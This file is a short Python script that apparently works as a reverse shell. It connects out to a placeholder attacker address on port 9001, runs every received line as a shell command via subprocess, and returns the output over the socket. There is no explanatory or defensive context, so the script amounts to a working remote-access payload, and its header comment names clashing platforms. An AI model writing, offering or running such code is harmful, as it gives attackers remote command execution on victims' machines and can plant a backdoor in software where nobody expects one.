# windows (Linux/macOS)
import socket
import sys
import subprocess
import threading
import time

LHOST = "IP_ADDRESS"
LPORT = 9001

def main():
    try:
        # Create TCP socket and connect
        tcp_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_client.connect((LHOST, LPORT))
        
        # Set socket to non-blocking to check for data availability
        tcp_client.setblocking(False)
        
        code = ""
        buffer_size = 1024
        
        while True:
            try:
                # Check if data is available
                ready_to_read, _, _ = select.select([tcp_client], [], [], 0.1)
                
                if ready_to_read:
                    # Read available data
                    data = tcp_client.recv(buffer_size)
                    if data:
                        # Decode the received data
                        received_code = data.decode('utf-8')
                        code += received_code
                        
                        # Check if we have a complete command (ends with newline)
                        if '\n' in received_code:
                            # Execute the command
                            if code.strip():
                                try:
                                    # Execute the command using subprocess
                                    output = subprocess.check_output(
                                        code.strip(),
                                        shell=True,
                                        stderr=subprocess.STDOUT,
                                        universal_newlines=True
                                    )
                                except subprocess.CalledProcessError as e:
                                    output = e.output
                                except Exception as e:
                                    output = str(e)
                                
                                # Send output back
                                tcp_client.sendall((output + "\n").encode('utf-8'))
                                code = ""
                
                # Check if connection is still alive
                tcp_client.send(b'')  # Try to send empty data to check connection
                
            except (socket.error, OSError):
                # Connection lost
                break
            except Exception as e:
                # Handle other exceptions
                try:
                    error_msg = f"Error: {str(e)}\n"
                    tcp_client.sendall(error_msg.encode('utf-8'))
                except:
                    break
                
            time.sleep(0.1)
    
    except Exception as e:
        print(f"Connection error: {e}")
    finally:
        # Clean up
        try:
            tcp_client.close()
        except:
            pass

if __name__ == "__main__":
    # Import select module
    import select
    main()
